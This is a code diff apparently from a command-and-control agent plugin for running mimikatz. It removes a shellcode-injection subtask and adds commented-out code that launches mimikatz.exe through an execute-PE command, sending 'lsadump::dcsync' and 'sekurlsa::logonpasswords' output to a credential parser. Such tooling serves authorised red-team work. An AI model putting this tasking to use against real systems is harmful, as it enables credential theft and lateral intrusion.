@@ -163,18 +163,28 @@ class MimikatCommand(CoffCommandBase):
             # Debugging
             # logging.info(taskData.args.to_json())
             
-            # Run inline_execute subtask
-            subtask = await SendMythicRPCTaskCreateSubtask(
-                MythicRPCTaskCreateSubtaskMessage(
-                    taskData.Task.ID,
-                    CommandName="inject_shellcode",
-                    SubtaskCallbackFunction="coff_completion_callback",
-                    Params=json.dumps({
-                        "shellcode_file": shellcode_file_uuid
-                    }),
-                    Token=taskData.Task.TokenID,
-                )
-            )
+            
+            # From Apollo Agent
+            # executePEArgs = ExecutePEArguments(command_line=json.dumps(
+            #     {
+            #         "pe_name": "mimikatz.exe",
+            #         "pe_arguments": commandline,
+            #     }
+            # ))
+            # await executePEArgs.parse_arguments()
+            # executePECommand = ExecutePECommand(agent_path=self.agent_code_path,
+            #                                     agent_code_path=self.agent_code_path,
+            #                                     agent_browserscript_path=self.agent_browserscript_path)
+            # # set our taskData args to be the new ones for execute_pe
+            # taskData.args = executePEArgs
+            # # executePE's creat_go_tasking function returns a response for us
+            # newResp = await executePECommand.create_go_tasking(taskData=taskData)
+            # # update the response to make sure this gets pulled down as execute_pe instead of mimikatz
+            # newResp.CommandName = "execute_pe"
+            # newResp.DisplayParams = commandline
+            # if "lsadump::dcsync" in commandline or "sekurlsa::logonpasswords" in commandline:
+            #     newResp.CompletionFunctionName = "parse_credentials"
+            # return newResp
                    
             #Debugging
             logging.info(taskData.args.to_json())
